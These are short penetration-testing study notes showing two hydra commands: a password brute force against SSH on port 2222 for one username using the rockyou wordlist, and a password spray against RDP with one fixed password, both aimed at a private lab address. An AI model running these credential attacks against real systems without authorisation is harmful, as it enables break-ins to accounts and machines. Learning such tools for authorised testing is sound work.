#### SSH RDP FTP Brute Force

let's user hydra to try to brute force ssh on port 2222

    $ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.50

if we are wanting to target rdp

    $ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.50
